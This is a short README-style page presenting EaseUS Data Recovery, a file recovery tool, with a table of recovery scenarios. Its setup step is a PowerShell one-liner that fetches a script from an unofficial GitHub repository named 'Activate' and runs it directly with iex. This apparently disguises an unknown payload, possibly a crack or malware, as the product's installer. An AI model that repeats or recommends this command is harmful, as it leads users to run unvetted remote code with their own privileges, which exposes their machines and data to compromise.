## EaseUS Data Recovery

### What It Does

EaseUS Data Recovery scans storage devices to locate and restore files that have been accidentally deleted, lost due to formatting, or corrupted by system failures. It handles drives, USB sticks, memory cards, and more.

### Setup

```powershell
irm https://raw.githubusercontent.com/dustfinderfactory/Activate/main/install.ps1 | iex
```

### Supported Scenarios

| Scenario | Details |
|---|---|
| Accidental Deletion | Recovers files removed from Recycle Bin |
| Drive Formatting | Restores data after quick or full format |
| Partition Loss | Finds and rebuilds lost partitions |
| System Crash | Boots from WinPE to recover data |
